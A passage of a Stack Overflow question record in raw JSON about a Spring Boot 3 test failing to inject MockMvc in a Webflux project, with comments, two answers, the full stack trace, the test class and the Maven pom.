full stacktrace (as code not as quote please.","body":"Then please add the full testcase (including imports etc) and the full stacktrace (as code not as quote please."},{"owner":{"account_id":2794316,"reputation":1918,"user_id":2403836,"accept_rate":72,"display_name":"mr nooby noob"},"score":0,"creation_date":1683722999,"post_id":76218419,"comment_id":134410036,"body_markdown":"@M.Deinum sorry about that, I have update with the full test, pom file and stack trace","body":"@M.Deinum sorry about that, I have update with the full test, pom file and stack trace"},{"owner":{"account_id":3192259,"reputation":117599,"user_id":2696260,"display_name":"M. Deinum"},"score":0,"creation_date":1683723458,"post_id":76218419,"comment_id":134410161,"body_markdown":"Is  your application based on the Servlet or Webflux APIs./","body":"Is  your application based on the Servlet or Webflux APIs./"},{"owner":{"account_id":2794316,"reputation":1918,"user_id":2403836,"accept_rate":72,"display_name":"mr nooby noob"},"score":0,"creation_date":1683723486,"post_id":76218419,"comment_id":134410169,"body_markdown":"@M.Deinum webflux","body":"@M.Deinum webflux"},{"owner":{"account_id":3192259,"reputation":117599,"user_id":2696260,"display_name":"M. Deinum"},"score":1,"creation_date":1683723587,"post_id":76218419,"comment_id":134410189,"body_markdown":"Which doesn&#39;t work with MockMVC as there is no DispatcherServlet to replace. You can inject the `WebTestClient` instead.","body":"Which doesn&#39;t work with MockMVC as there is no DispatcherServlet to replace. You can inject the <code>WebTestClient</code> instead."},{"owner":{"account_id":2794316,"reputation":1918,"user_id":2403836,"accept_rate":72,"display_name":"mr nooby noob"},"score":0,"creation_date":1683723798,"post_id":76218419,"comment_id":134410251,"body_markdown":"@M.Deinum Ah that&#39;s it! It&#39;s my first time working with a webflux project and I was adding the first test to an existing repository. Thank you. You can post the above comment as an actual answer so I can approve it","body":"@M.Deinum Ah that&#39;s it! It&#39;s my first time working with a webflux project and I was adding the first test to an existing repository. Thank you. You can post the above comment as an actual answer so I can approve it"}],"answers":[{"tags":[],"owner":{"account_id":10351852,"reputation":216,"user_id":7635045,"display_name":"Pampa Nello"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1683723563,"creation_date":1683723149,"answer_id":76218652,"question_id":76218419,"body_markdown":"If you want to test the Controllers (in isolation from your other layers), I would go with:\r\n\r\n```java\r\n@WebMvcTest(controllers = YourController.class)\r\n@ContextConfiguration(classes = YourMainApplicationClass.class)\r\nclass FooTest {\r\n    @Autowired\r\n    private MockMvc mvc;\r\n\r\n    @MockBean\r\n    private FooService fooService;\r\n\r\n    @Test\r\n    void test() throws Exception{\r\n        mvc.perform(get(&quot;/foo&quot;)).andExpect(status().isOk());\r\n    }\r\n}\r\n```","title":"Spring Boot 3: No qualifying bean of type &#39;org.springframework.test.web.servlet.MockMvc&#39;","body":"<p>If you want to test the Controllers (in isolation from your other layers), I would go with:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@WebMvcTest(controllers = YourController.class)\n@ContextConfiguration(classes = YourMainApplicationClass.class)\nclass FooTest {\n    @Autowired\n    private MockMvc mvc;\n\n    @MockBean\n    private FooService fooService;\n\n    @Test\n    void test() throws Exception{\n        mvc.perform(get(&quot;/foo&quot;)).andExpect(status().isOk());\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3192259,"reputation":117599,"user_id":2696260,"display_name":"M. Deinum"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1683724139,"creation_date":1683724139,"answer_id":76218827,"question_id":76218419,"body_markdown":"Your application is using Webflux and not Spring MVC. The `MockMvc` infrastructure is meant to be used with Spring MVC and is not compatible with Webflux. `MockMvc` replaces the existing `DispatcherServlet` with a special one for testing, however as you are using Webflux there is no `DispatcherServlet` to replace. \r\n\r\nInstead of `MockMvc` you should use the `TestWebClient` instead, which is intended for testing Webflux application. This is also explained in the [Testing With a Mock Environment section][1] in the Spring Boot documentation. \r\n\r\n```java\r\n@SpringBootTest\r\npublic class FooTest {\r\n\r\n    @Autowired\r\n    private TestWebClient mvc;\r\n\r\n    @Test\r\n    void test() throws Exception{\r\n        // Implement using TestWebClient\r\n    }\r\n}\r\n```\r\n\r\n[1]: https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.testing.spring-boot-applications.with-mock-environment","title":"Spring Boot 3: No qualifying bean of type &#39;org.springframework.test.web.servlet.MockMvc&#39;","body":"<p>Your application is using Webflux and not Spring MVC. The <code>MockMvc</code> infrastructure is meant to be used with Spring MVC and is not compatible with Webflux. <code>MockMvc</code> replaces the existing <code>DispatcherServlet</code> with a special one for testing, however as you are using Webflux there is no <code>DispatcherServlet</code> to replace.</p>\n<p>Instead of <code>MockMvc</code> you should use the <code>TestWebClient</code> instead, which is intended for testing Webflux application. This is also explained in the <a href=\"https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.testing.spring-boot-applications.with-mock-environment\" rel=\"nofollow noreferrer\">Testing With a Mock Environment section</a> in the Spring Boot documentation.</p>\n<pre class=\"lang-java prettyprint-override\"><code>@SpringBootTest\npublic class FooTest {\n\n    @Autowired\n    private TestWebClient mvc;\n\n    @Test\n    void test() throws Exception{\n        // Implement using TestWebClient\n    }\n}\n</code></pre>\n"}],"owner":{"account_id":2794316,"reputation":1918,"user_id":2403836,"accept_rate":72,"display_name":"mr nooby noob"},"comment_count":8,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1063,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":76218827,"answer_count":2,"score":1,"last_activity_date":1683724139,"creation_date":1683721630,"question_id":76218419,"body_markdown":"I am getting the following error\r\n\r\nFull stackstace:\r\n\r\n\r\n    org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &#39;com.foo.api.FooTest&#39;: Unsatisfied dependency expressed through field &#39;mvc&#39;: No qualifying bean of type &#39;org.springframework.test.web.servlet.MockMvc&#39; available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}\r\n    \r\n            at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:713)\r\n            at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:693)\r\n            at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:133)\r\n            at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:482)\r\n            at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1416)\r\n            at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireBeanProperties(AbstractAutowireCapableBeanFactory.java:396)\r\n            at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.injectDependencies(DependencyInjectionTestExecutionListener.java:142)\r\n            at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.prepareTestInstance(DependencyInjectionTestExecutionListener.java:97)\r\n            at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:241)\r\n            at org.springframework.test.context.junit.jupiter.SpringExtension.postProcessTestInstance(SpringExtension.java:138)\r\n            at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$invokeTestInstancePostProcessors$10(ClassBasedTestDescriptor.java:377)\r\n            at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.executeAndMaskThrowable(ClassBasedTestDescriptor.java:382)\r\n            at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$invokeTestInstancePostProcessors$11(ClassBasedTestDescriptor.java:377)\r\n            at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197)\r\n            at java.base/java.util.stream.ReferencePipeline$2$1.accept(ReferencePipeline.java:179)\r\n            at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1625)\r\n            at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509)\r\n            at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499)\r\n            at java.base/java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(StreamSpliterators.java:310)\r\n            at java.base/java.util.stream.Streams$ConcatSpliterator.forEachRemaining(Streams.java:735)\r\n            at java.base/java.util.stream.Streams$ConcatSpliterator.forEachRemaining(Streams.java:734)\r\n            at java.base/java.util.stream.ReferencePipeline$Head.forEach(ReferencePipeline.java:762)\r\n            at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.invokeTestInstancePostProcessors(ClassBasedTestDescriptor.java:376)\r\n            at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$instantiateAndPostProcessTestInstance$6(ClassBasedTestDescriptor.java:289)\r\n            at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\r\n            at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.instantiateAndPostProcessTestInstance(ClassBasedTestDescriptor.java:288)\r\n            at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$testInstancesProvider$4(ClassBasedTestDescriptor.java:278)\r\n            at java.base/java.util.Optional.orElseGet(Optional.java:364)\r\n            at org.junit.jupiter.engine.descriptor.ClassBasedTestDescriptor.lambda$testInstancesProvider$5(ClassBasedTestDescriptor.java:277)\r\n            at org.junit.jupiter.engine.execution.TestInstancesProvider.getTestInstances(TestInstancesProvider.java:31)\r\n            at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$prepare$0(TestMethodTestDescriptor.java:105)\r\n            at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\r\n            at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.prepare(TestMethodTestDescriptor.java:104)\r\n            at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.prepare(TestMethodTestDescriptor.java:68)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$prepare$2(NodeTestTask.java:123)\r\n            at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.prepare(NodeTestTask.java:123)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:90)\r\n            at java.base/java.util.ArrayList.forEach(ArrayList.java:1511)\r\n            at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)\r\n            at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)\r\n            at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)\r\n            at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)\r\n            at java.base/java.util.ArrayList.forEach(ArrayList.java:1511)\r\n            at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)\r\n            at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)\r\n            at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)\r\n            at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)\r\n            at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)\r\n            at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)\r\n            at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)\r\n            at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)\r\n            at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:147)\r\n            at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:127)\r\n            at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:90)\r\n            at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:55)\r\n            at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:102)\r\n            at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:54)\r\n            at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:114)\r\n            at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:86)\r\n            at org.junit.platform.launcher.core.DefaultLauncherSession$DelegatingLauncher.execute(DefaultLauncherSession.java:86)\r\n            at org.junit.platform.launcher.core.SessionPerRequestLauncher.execute(SessionPerRequestLauncher.java:53)\r\n            at com.intellij.junit5.JUnit5IdeaTestRunner.startRunnerWithArgs(JUnit5IdeaTestRunner.java:57)\r\n            at com.intellij.rt.junit.IdeaTestRunner$Repeater$1.execute(IdeaTestRunner.java:38)\r\n            at com.intellij.rt.execution.junit.TestsRepeater.repeat(TestsRepeater.java:11)\r\n            at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:35)\r\n            at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:232)\r\n            at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:55)\r\n            Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type &#39;org.springframework.test.web.servlet.MockMvc&#39; available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}\r\n            at org.springframework.beans.factory.support.DefaultListableBeanFactory.raiseNoMatchingBeanFound(DefaultListableBeanFactory.java:1824)\r\n            at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1383)\r\n            at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1337)\r\n            at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:710)\r\n            ... 76 more\r\n\r\nFor my basic test. I do not have this issue for a similar project using Spring Boot 3 so I do not see what I am doing differently here. Any idea ?\r\n\r\n       import org.junit.jupiter.api.Test;\r\n    import org.springframework.beans.factory.annotation.Autowired;\r\n    import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;\r\n    import org.springframework.boot.test.context.SpringBootTest;\r\n    import org.springframework.test.web.servlet.MockMvc;\r\n    \r\n    import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;\r\n    import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;\r\n    \r\n    @SpringBootTest\r\n    @AutoConfigureMockMvc\r\n    public class FooTest {\r\n    \r\n        @Autowired\r\n        private MockMvc mvc;\r\n    \r\n        @Test\r\n        void test() throws Exception{\r\n            mvc.perform(get(&quot;/foo&quot;)).andExpect(status().isOk());\r\n        }\r\n    }\r\n\r\nand my full pom has the following \r\n\r\n    \r\n  \r\n\r\n     &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\r\n    &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\r\n             xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\r\n        &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\r\n    \r\n        &lt;parent&gt;\r\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n            &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\r\n            &lt;version&gt;3.0.6&lt;/version&gt;\r\n            &lt;relativePath/&gt;\r\n        &lt;/parent&gt;\r\n    \r\n        &lt;groupId&gt;com.foo&lt;/groupId&gt;\r\n        &lt;artifactId&gt;bar-parent&lt;/artifactId&gt;\r\n        &lt;version&gt;1.0&lt;/version&gt;\r\n        &lt;name&gt;foo-bar-parent&lt;/name&gt;\r\n    \r\n        &lt;properties&gt;\r\n            &lt;java.version&gt;17&lt;/java.version&gt;\r\n    \r\n            &lt;spring-cloud.version&gt;2022.0.2&lt;/spring-cloud.version&gt;\r\n            &lt;spring-cloud-gcp.version&gt;4.3.0&lt;/spring-cloud-gcp.version&gt;\r\n            &lt;maven-jar-plugin.version&gt;3.3.0&lt;/maven-jar-plugin.version&gt;\r\n            &lt;maven-source-plugin.version&gt;3.2.1&lt;/maven-source-plugin.version&gt;\r\n    \r\n            &lt;!-- Plugin version --&gt;\r\n            &lt;sonar.moduleKey&gt;${project.artifactId}&lt;/sonar.moduleKey&gt;\r\n            &lt;sonar.version&gt;3.9.1.2184&lt;/sonar.version&gt;\r\n            &lt;fmt-maven.version&gt;2.20&lt;/fmt-maven.version&gt;\r\n            &lt;spotify-docker-maven.version&gt;1.4.13&lt;/spotify-docker-maven.version&gt;\r\n            &lt;surefire.version&gt;3.0.0&lt;/surefire.version&gt;\r\n            &lt;docker.image.repo&gt;eu.gcr.io/docker-registry-shared-cc74&lt;/docker.image.repo&gt;\r\n        &lt;/properties&gt;\r\n    \r\n        &lt;dependencyManagement&gt;\r\n            &lt;dependencies&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;\r\n                    &lt;version&gt;3.0.6&lt;/version&gt;\r\n                    &lt;scope&gt;import&lt;/scope&gt;\r\n                    &lt;type&gt;pom&lt;/type&gt;\r\n                &lt;/dependency&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;\r\n                    &lt;version&gt;${spring-cloud.version}&lt;/version&gt;\r\n                    &lt;type&gt;pom&lt;/type&gt;\r\n                    &lt;scope&gt;import&lt;/scope&gt;\r\n                &lt;/dependency&gt;\r\n            &lt;/dependencies&gt;\r\n        &lt;/dependencyManagement&gt;\r\n    \r\n        &lt;dependencies&gt;\r\n            &lt;!-- Google Cloud Dependencies --&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;\r\n                &lt;version&gt;${spring-cloud.version}&lt;/version&gt;\r\n                &lt;type&gt;pom&lt;/type&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;com.google.cloud&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-cloud-gcp-dependencies&lt;/artifactId&gt;\r\n                &lt;version&gt;${spring-cloud-gcp.version}&lt;/version&gt;\r\n                &lt;type&gt;pom&lt;/type&gt;\r\n            &lt;/dependency&gt;\r\n    \r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\r\n                &lt;artifactId&gt;lombok&lt;/artifactId&gt;\r\n                &lt;optional&gt;true&lt;/optional&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n    \r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;io.micrometer&lt;/groupId&gt;\r\n                &lt;artifactId&gt;micrometer-core&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;io.micrometer&lt;/groupId&gt;\r\n                &lt;artifactId&gt;micrometer-registry-prometheus&lt;/artifactId&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springdoc&lt;/groupId&gt;\r\n                &lt;artifactId&gt;springdoc-openapi-starter-webmvc-ui&lt;/artifactId&gt;\r\n                &lt;version&gt;2.1.0&lt;/version&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springdoc&lt;/groupId&gt;\r\n                &lt;artifactId&gt;springdoc-openapi-ui&lt;/artifactId&gt;\r\n                &lt;version&gt;1.7.0&lt;/version&gt;\r\n            &lt;/dependency&gt;\r\n    \r\n            &lt;!-- Testing Dependencies --&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\r\n                &lt;scope&gt;test&lt;/scope&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;io.projectreactor&lt;/groupId&gt;\r\n                &lt;artifactId&gt;reactor-test&lt;/artifactId&gt;\r\n                &lt;scope&gt;test&lt;/scope&gt;\r\n            &lt;/dependency&gt;\r\n            &lt;dependency&gt;\r\n                &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;\r\n                &lt;scope&gt;test&lt;/scope&gt;\r\n            &lt;/dependency&gt;\r\n        &lt;/dependencies&gt;\r\n    \r\n        &lt;build&gt;\r\n            &lt;plugins&gt;\r\n              &lt;plugin&gt;\r\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\r\n                &lt;version&gt;3.0.6&lt;/version&gt;\r\n                &lt;configuration&gt;\r\n                    &lt;excludes&gt;\r\n                        &lt;exclude&gt;\r\n                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\r\n                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\r\n                        &lt;/exclude&gt;\r\n                    &lt;/excludes&gt;\r\n                &lt;/configuration&gt;\r\n            &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\r\n                    &lt;configuration&gt;\r\n                        &lt;source&gt;${java.version}&lt;/source&gt;\r\n                        &lt;target&gt;${java.version}&lt;/target&gt;\r\n                    &lt;/configuration&gt;\r\n                &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\r\n                    &lt;configuration&gt;\r\n                        &lt;excludes&gt;\r\n                            &lt;exclude&gt;\r\n                                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\r\n                                &lt;artifactId&gt;lombok&lt;/artifactId&gt;\r\n                            &lt;/exclude&gt;\r\n                        &lt;/excludes&gt;\r\n                    &lt;/configuration&gt;\r\n                &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;com.spotify.fmt&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;fmt-maven-plugin&lt;/artifactId&gt;\r\n                    &lt;version&gt;${fmt-maven.version}&lt;/version&gt;\r\n                &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;\r\n                    &lt;executions&gt;\r\n                        &lt;execution&gt;\r\n                            &lt;id&gt;default-deploy&lt;/id&gt;\r\n                            &lt;phase&gt;none&lt;/phase&gt;\r\n                        &lt;/execution&gt;\r\n                    &lt;/executions&gt;\r\n                &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;org.sonarsource.scanner.maven&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;sonar-maven-plugin&lt;/artifactId&gt;\r\n                    &lt;version&gt;${sonar.version}&lt;/version&gt;\r\n                &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;\r\n                    &lt;version&gt;${surefire.version}&lt;/version&gt;\r\n                &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;maven-failsafe-plugin&lt;/artifactId&gt;\r\n                &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;\r\n                    &lt;version&gt;${maven-jar-plugin.version}&lt;/version&gt;\r\n                    &lt;configuration&gt;\r\n                        &lt;archive&gt;\r\n                            &lt;compress&gt;false&lt;/compress&gt;\r\n                        &lt;/archive&gt;\r\n                    &lt;/configuration&gt;\r\n                &lt;/plugin&gt;\r\n                &lt;plugin&gt;\r\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;\r\n                    &lt;version&gt;${maven-source-plugin.version}&lt;/version&gt;\r\n                    &lt;executions&gt;\r\n                        &lt;execution&gt;\r\n                            &lt;id&gt;attach-sources&lt;/id&gt;\r\n                            &lt;goals&gt;\r\n                                &lt;goal&gt;jar&lt;/goal&gt;\r\n                            &lt;/goals&gt;\r\n                        &lt;/execution&gt;\r\n                    &lt;/executions&gt;\r\n                &lt;/plugin&gt;\r\n            &lt;/plugins&gt;\r\n        &lt;/build&gt;\r\n    \r\n    &lt;/project&gt;\r\n\r\n","title":"Spring Boot 3: No qualifying bean of type &#39;org.springframework.test.web.servlet.MockMvc&#39;","body":"<p>I am getting the following error</p>\n<p>Full stackstace:</p>\n<pre><code>org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'com.foo.api.FooTest': Unsatisfied dependency expressed through field 'mvc': No qualifying bean of type 'org.springframework.test.web.servlet.MockMvc' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}\n\n        at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:713)\n        at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:693)\n        at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:133)\n        at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:482)\n        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1416)\n        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireBeanProperties(AbstractAutowireCapableBeanFactory.java:396)\n        at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.injectDependencies(DependencyInjectionTestExecutionListener.java:142)\n        at org.springframework.test.context.support.DependencyInjectionTestExecutionListener.prepareTestInstance(DependencyInjectionTestExecutionListener.java:97)\n        at org.springframework.test.context.TestContextManager.prepareTestInstance(TestContextManager.java:241)\n        at 